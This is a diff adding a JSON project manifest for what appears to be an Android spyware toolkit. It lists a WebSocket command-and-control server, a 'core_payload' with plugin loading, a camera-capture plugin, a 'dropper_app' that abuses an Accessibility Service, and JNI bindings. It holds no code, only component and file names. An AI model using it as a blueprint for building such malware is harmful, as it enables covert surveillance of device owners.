@@ -1,0 +1,87 @@
+{
+  "tech_stack": [
+    "Go",
+    "Gin Web Framework",
+    "WebSocket",
+    "Rust",
+    "libloading",
+    "serde_json",
+    "C++",
+    "CMake",
+    "JNI",
+    "Android SDK",
+    "NDK",
+    "Java",
+    "Kotlin"
+  ],
+  "features": [
+    {
+      "name": "C2 Server WebSocket API",
+      "description": "WebSocket-based command and control server for managing connected clients",
+      "files": [
+        "c2_server/cmd/server/main.go",
+        "c2_server/internal/services/client_manager.go",
+        "c2_server/internal/websocket/handler.go"
+      ],
+      "api_doc": {
+        "openapi": "3.0.0",
+        "paths": {
+          "/ws": {
+            "get": {
+              "summary": "WebSocket endpoint for client connections",
+              "responses": {"101": {"description": "Switching Protocols"}}
+            }
+          }
+        }
+      }
+    },
+    {
+      "name": "REST API Endpoints",
+      "description": "RESTful API for client management and command execution",
+      "files": [
+        "c2_server/internal/api/routes.go",
+        "c2_server/internal/api/handlers.go"
+      ],
+      "api_doc": {
+        "openapi": "3.0.0",
+        "paths": {
+          "/api/clients": {
+            "get": {"summary": "List all connected clients"},
+            "post": {"summary": "Send command to client"}
+          }
+        }
+      }
+    },
+    {
+      "name": "Plugin System",
+      "description": "Dynamic plugin loading and execution system",
+      "files": [
+        "core_payload/src/plugin.rs",
+        "plugins/src/camera_access/camera_access.cpp",
+        "plugins/include/plugin_api/plugin.h"
+      ]
+    },
+    {
+      "name": "Camera Access Plugin",
+      "description": "Plugin for accessing device camera and capturing images",
+      "files": [
+        "plugins/src/camera_access/camera_access.cpp",
+        "plugins/src/camera_access/camera_access.h"
+      ]
+    },
+    {
+      "name": "Android Accessibility Service",
+      "description": "Android service for accessibility features and permission management",
+      "files": [
+        "dropper_app/app/src/main/java/com/hermes/spectre/HermesAccessibilityService.kt"
+      ]
+    },
+    {
+      "name": "JNI Bindings",
+      "description": "Java Native Interface bindings for plugin execution",
+      "files": [
+        "plugins/bindings/jni/plugin_jni.cpp"
+      ]
+    }
+  ]
+}
